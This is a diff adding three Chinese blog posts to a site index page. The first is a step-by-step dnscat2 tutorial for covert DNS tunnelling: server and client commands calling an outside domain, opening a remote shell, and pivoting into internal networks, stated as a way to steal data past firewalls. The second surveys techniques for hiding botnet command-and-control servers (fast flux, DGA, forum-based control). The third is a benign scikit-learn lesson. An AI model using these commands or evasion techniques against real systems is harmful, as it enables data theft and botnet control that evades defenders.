@@ -258,6 +258,1128 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/07/利用DNS-Tunnel传输数据/" itemprop="url">
+                  利用DNS Tunnel传输数据
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
+                2018-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
+<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
+<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
+<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
+<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
+<p>DNS Tunnel可以分为直连和中继两种。</p>
+<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
+<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
+<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
+<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
+<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
+<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
+<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
+<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
+<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
+<p>出现几行绿色字体如下所示就代表安装完成了：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
+<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
+<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
+<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
+<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
+<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
+<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
+<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
+<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
+<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
+<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
+<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
+<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<p>然后使用help可以查看可以使用的命令：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
+<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
+<p>之后就可以使用命令交互：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
+<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
+<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
+<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
+<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
+<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
+<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
+<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/C-C控制服务思路浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/03/C-C控制服务思路浅析/" itemprop="url">
+                  C&C控制服务思路浅析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:48:49+08:00">
+                2018-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/03/C-C控制服务思路浅析/" class="leancloud_visitors" data-flag-title="C&C控制服务思路浅析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的博客中写过一次用python实现的后门 <a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a> 里面的代码用最简单的例子来实现了远程控制。</p>
+<p>但是当我们想要构建大规模僵尸网络的时候，就会发现这类简单的后门很不方便，我们不可能有时间一个一个手动的进行控制。而且大部分的肉鸡ip都是一直在变动而且无法直接访问的，所以远控中基本都使用反弹式通信，反弹式通信需要肉鸡每隔一段时间对我们的控制机发送心跳包，但是我们自己的电脑，ip很多情况也都是一直在变动的，我们很难保证自己拥有一个不变的公网ip。为了避免这些问题，我们就需要一台能够集中统一控制僵尸网络的主机，也就是C&amp;C服务器。</p>
+<ul>
+<li>C&amp;C服务器：command and control server(命令与控制服务器)。一般是指挥控制僵尸网络的主控服务器，用来和每个肉鸡进行通信并指挥它们的攻击行为。</li>
+</ul>
+<p>当然我这篇并不打算写一个简单的主控脚本和远控脚本，然后把它部署到公网服务器中，毕竟这些步骤只需要稍微改一下最开始那个链接里面脚本的代码就可以了。这篇我想要对通过各种方法部署和隐藏C&amp;C服务器的方法做一个总结。</p>
+<h2 id="0x01-通过IP地址访问C-amp-C服务器"><a href="#0x01-通过IP地址访问C-amp-C服务器" class="headerlink" title="0x01 通过IP地址访问C&amp;C服务器"></a>0x01 通过IP地址访问C&amp;C服务器</h2><p>最简单的方法就是租用一台云服务器，将服务器ip直接写远控脚本中反弹的ip中，然后所有肉鸡都会每隔一段时间与这个ip进行一次通信，我们也就可以在服务器上用脚本控制僵尸网络发动攻击。</p>
+<p>但是由于ip地址是直接写死在远控脚本或远控程序中的，如果对方捕获了远控脚本或者远控程序，进行简单的二进制逆向扫描就可以得到我们服务器ip地址，并且对方机器经常访问同一个ip也会增加被发现的几率。一旦被发现，对方直接将ip加入黑名单，并且将ip提交给我们购买云服务器的提供商，服务器被封禁就会使远控全部失效。</p>
+<p>优点：简单易实现、耗费小(仅服务器开销)。</p>
+<p>缺点：极易被发现、很容易大规模失效。</p>
+<h2 id="0x02-通过域名访问C-amp-C服务器"><a href="#0x02-通过域名访问C-amp-C服务器" class="headerlink" title="0x02 通过域名访问C&amp;C服务器"></a>0x02 通过域名访问C&amp;C服务器</h2><p>通过域名再指向服务器比起直接指向服务器只是将反弹ip改为反弹的域名。如果注册一些较正常的域名并且做一个伪装的主页，被发现的几率就会降低，而且直接二进制扫描不会被发现。但是逆向程序或着搭建蜜罐进行动态测试，很容易就能追踪到这些域名，将域名丢给运营商的黑名单就会造成大规模的远控失效。</p>
+<p>不过比起仅通过ip地址访问这种方式要多花去安全人员的一点时间，如果在这个时间内达成目的，也算是成功了。</p>
+<p>优点：简单易实现、耗费小(服务器和域名开销)。</p>
+<p>缺点：易被发现、很容易大规模失效。</p>
+<h2 id="0x03-Fast-flux"><a href="#0x03-Fast-flux" class="headerlink" title="0x03 Fast flux"></a>0x03 Fast flux</h2><p>如果一个域名很容易被蜜罐捕获的话，我们可以将几十个域名分散的写在代码中，这些域名都指向同一台服务器的ip地址，程序会对域名轮换访问，然后提供一个较短的ttl使域名对ip的解析记录也会不断的更换。</p>
+<p>这样被捕获某一部分域名添加黑名单并没有办法阻止恶意软件。而且因为ip解析记录一直变更也无法直接举报服务器，所以需要安全人员很高的逆向能力将恶意域名全部找出来。</p>
+<p>不过这个方式有两个缺陷，一个是将捕获的一部分恶意域名的ip解析历史记录进行统计、数据分析，也会很快找到服务器的ip地址。另一个缺陷是域名记录的TTL相比正常的过短，容易被抓住特征。</p>
+<p>优点：被发现后较难快速处理、被屏蔽一部分域名不会造成僵尸网络失效。</p>
+<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费较大(多个域名的开销)、一旦服务器ip被发现仍然会大规模失效。</p>
+<h2 id="0x04-Double-flux、Triple-flux"><a href="#0x04-Double-flux、Triple-flux" class="headerlink" title="0x04 Double flux、Triple flux"></a>0x04 Double flux、Triple flux</h2><p>既然Fast flux容易被捕获一部分恶意域名进行数据分析而发现ip，那域名能增加ip也能增加，Double flux就是在一般的fast flux过程中除了轮换域名，也让ip可以轮换，如果我们有M个域名和N个ip这样就产生了M*N组的C&amp;C通道，还有更多的干扰项。</p>
+<p>Triple flux在Double flux的基础上，增加一层Name Server通过CNAME方式解析，这样域名有可能指向ip也有可能指向别的域名，然后再指向ip，这些Name Server也会定期轮换，就增加了更多C&amp;C通道和干扰项。</p>
+<p>这两种方法都增加了安全人员分析的难度，而且不会因为个别的服务器或域名被封禁导致僵尸网络失效，但是仍然存在着和普通Fast flux一样的问题，那就是因为域名到ip的解析一直轮换导致TTL需要设置很短，很容易被抓取特征而捕获。</p>
+<p>优点：被发现后较难快速处理、被屏蔽一部分域名、封禁一部分ip都不会造成僵尸网络失效。</p>
+<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费很大(多个域名和多个服务器的开销)。</p>
+<h2 id="0x05-使用论坛等作为C-amp-C服务器"><a href="#0x05-使用论坛等作为C-amp-C服务器" class="headerlink" title="0x05 使用论坛等作为C&amp;C服务器"></a>0x05 使用论坛等作为C&amp;C服务器</h2><p>自己架设服务器很容易被封禁，然后丢失僵尸网络的控制权，有的攻击者想到一个绝佳的办法：通过在一些论坛的冷门区域发一些C&amp;C控制指令，然后让恶意软件通过爬虫在访问这些论坛的时候获取指令，最开始主要是在twitter上进行C&amp;C控制，这种情况一开始很让安全人员头疼，因为访问这些论坛的请求本就和正常数据包差不多很难被发现，而且就算发现了，总不能把twitter的域名或者服务器添加很名单吧，这会影响网络的正常使用。后来发现了这种情况可以进行举报，从而封禁对应的账号。</p>
+<p>优点：耗费低、不是特别容易被发现。</p>
+<p>缺点：被发现后会被直接封禁账号损失僵尸网络。</p>
+<h2 id="0x06-使用随机域名生成算法"><a href="#0x06-使用随机域名生成算法" class="headerlink" title="0x06 使用随机域名生成算法"></a>0x06 使用随机域名生成算法</h2><p>比起注册一堆域名耗费巨大，更好的办法是使用DGA(Domain Generation Algorithm)算法，这种C&amp;C控制方法的思路就是控制一个确定的随机域名生成算法，用约定好的随机数种子生成大量的随机域名（如当天日期时间），恶意软件对这些域名全部进行访问，我们只需要按照规律注册其中个别有可能的域名就可以进行控制。</p>
+<p>这个方法的重点在于没有任何确定的域名写入到恶意软件里，即使逆向也找不到真正的域名，而且逆向出这个随机算法的难度非常大。并且生成的随机域名数量十分巨大对方无法得知究竟我们注册了哪个域名。由于随机算法(提前设定好)和随机种子(可以根据时间等生成)都是我们不需要通信就可以得知的信息，我们任何时候都可以知道该注册那种类型的域名可以进行控制。</p>
+<p>除非源码泄露，安全人员要逆向出DGA算法是非常困难的，也很难用黑名单的方式屏蔽掉所有的域名。目前应对这种C&amp;C的方法一般是利用机器学习算法去判定域名的随机性，然后筛选出有可能是恶意域名的域名进行分析找出ip，或者利用机器学习算法智能的屏蔽对这些域名的访问。</p>
+<p>天下没有免费的午餐，这种方式比起前面的方法也有一个缺陷，产生的随机域名过多且访问频率有限的时候，想通过C&amp;C服务器进行控制就需要等待较长的时间，所以在攻击时灵活度不足。强行减少等待的时间就得增加访问频率，就会增加被发现的概率。</p>
+<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
+<p>缺点：控制延迟很高、灵活度不足。</p>
+<h2 id="0x07-使用变形DGA算法"><a href="#0x07-使用变形DGA算法" class="headerlink" title="0x07 使用变形DGA算法"></a>0x07 使用变形DGA算法</h2><p>这个方法是为了对抗检测域名随机性的机器学习算法而产生的，大体步骤和上面相似，不同处是比起使用域名随机算法，添加一些英文单词作为字典构成域名，就比较接近正常的网页，不会被普通的机器学习算法检测出来。</p>
+<p>还是那句话，天下没有免费的午餐，添加字典减少了随机性，必然会缩小产生域名的数量，很快就会用完所有的域名。</p>
+<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
+<p>缺点：控制延迟很高、灵活度不足。</p>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>C&amp;C的设计与防御是目前攻防中很重要的一部分，围绕着C&amp;C，双方在攻防博弈中各显神通，完美的结合了机器学习、数据科学等知识，是非常有学习和研究价值的。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/python-scikit-learn学习-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/01/python-scikit-learn学习-2/" itemprop="url">
+                  python-scikit learn学习(2)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-01T17:06:38+08:00">
+                2018-08-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/01/python-scikit-learn学习-2/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(2)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
+<h2 id="0x01-模型属性与功能"><a href="#0x01-模型属性与功能" class="headerlink" title="0x01 模型属性与功能"></a>0x01 模型属性与功能</h2><p>sklearn库中所有机器学习的模型对象中都有一些属性与功能，假设模型对象名为mod，那么就可以这样表示mod模型的一些属性与功能：</p>
+<ul>
+<li>mod.coef_  x前的系数</li>
+<li>mod.intercept_  截距</li>
+<li>mod.predict() 预测</li>
+<li>mod.get_params() 定义的参数</li>
+<li>mod.score(data_x,data_y) 用data_x做预测，用data_y做比较给模型打分</li>
+</ul>
+<p>我们以上一篇中的线性回归模型为例查看一下这些属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=2,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.coef_)</span><br><span class="line">print(lr.intercept_)</span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(lr.get_params())</span><br><span class="line">print(lr.score(example_x,example_y))</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn07.png?raw=true" alt=""></p>
+<p>可以从输出中看到：</p>
+<ul>
+<li>lr.coef_输出一个list代表每一种特征前的系数</li>
+<li>lr.intercept_输出截距</li>
+<li>lr.predict()方法可以输入样本进行预测</li>
+<li>lr.get_params()方法可以输出模型的配置信息</li>
+<li>lr.score()方法通过对比预测的数据和原始标签对模型打分</li>
+</ul>
+<h2 id="0x02-标准化"><a href="#0x02-标准化" class="headerlink" title="0x02 标准化"></a>0x02 标准化</h2><p>在训练模型时，某些特征可能会在不同的样本中相差特别大，有一些异常大或者异常小的数据会对模型训练结果造成较大误差，并且数据分布很分散也会影响训练结果，所以一般在训练之前，我们都会对特征数值进行标准化。</p>
+<p>基本的标准化流程是去除每个特征的平均值来转换数据使其居中，然后通过将非常数特征除以它们的标准差来对其进行缩放。</p>
+<p>在scikit-learn库中，有用于预处理数据的模块sklearn.preprocessing，其中scale方法可以快速简便的实现上述标准化操作。用一段代码来尝试一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import preprocessing</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x_train = np.array([[1, -100, 0.03],</span><br><span class="line">              [-1, 500, -0.02],</span><br><span class="line">              [0.2, 200, 0.04]], dtype=np.float64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(preprocessing.scale(x_train))</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn08.png?raw=true" alt=""></p>
+<p>可以看到，数据都被标准化到很接近的位置，这样就更利于学习器训练了。</p>
